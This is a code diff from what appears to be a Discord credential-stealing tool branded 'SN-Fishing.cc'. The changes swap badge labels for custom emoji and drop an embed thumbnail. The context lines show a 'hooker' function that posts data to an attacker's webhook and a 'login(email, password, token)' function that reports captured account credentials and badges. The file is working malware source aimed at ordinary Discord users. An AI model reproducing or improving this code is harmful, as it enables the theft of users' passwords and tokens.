@@ -530,45 +530,44 @@ const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
     case 1:
-      badges += 'Discord Staff, ';
+      badges += ' <:6832badgediscordstaff:985676806294233140> ';
       break;
     case 2:
-      badges += 'Partnered Server Owner, ';
+      badges += ' <:7606badgepartneredserverowner:985676965086375976> ';
       break;
     case 131072:
-      badges += ' <:DevBadge:912727453875699733> ';
+      badges += ' <:1564badgedeveloper:985677107399118900> ';
       break;
     case 4:
-      badges += ' <a:CH_IconHypesquadShiny:928551747591487548> ';
+      badges += ' <:7606badgehypesquadevents:985677218707554375> ';
       break;
     case 16384:
-      badges += 'Gold BugHunter, ';
+      badges += ' <:7904discordbughunterlv2:985677598619209729> ';
       break;
     case 8:
-      badges += 'Green BugHunter, ';
+      badges += ' <:9595badgebughunter:985677427487436861> ';
       break;
     case 512:
-      badges += ' <a:early:913099122968494170> ';
+      badges += ' <:6832badgeearlysupporter:985677713719324692> ';
       break;
     case 128:
-      badges += ' <:brilliance:919973089285120111> ';
+      badges += '<:1350discordbrillance:985677830325170266> ';
       break;
     case 64:
-      badges += ' <:bravery:919973089222205451> ';
+      badges += ' <:1247discordbravery:985677969861259285> ';
       break;
     case 256:
-      badges += ' <:balance:919973088651776001> ';
+      badges += ' <:5946discordbalance:985678482619113522> ';
       break;
     case 0:
-      badges = '`No Badges`';
+      badges = 'No Badges';
       break;
     default:
-      badges = '`No Badges`';
+      badges = 'No Badges';
       break;
   }
   return badges;
 };
-
 const hooker = async (content) => {
   const data = JSON.stringify(content);
   const url = new URL(config.webhook);
@@ -651,9 +650,6 @@ const login = async (email, password, token) => {
         },
         footer: {
           text: "@SN-Fishing.cc 🐟",
-        },
-        thumbnail: {
-          url: 'https://cdn.discordapp.com/attachments/985538825151459341/987097007774654614/2e79085df912c93156b05504759adb5b-1.png',
         },
       },
     ],
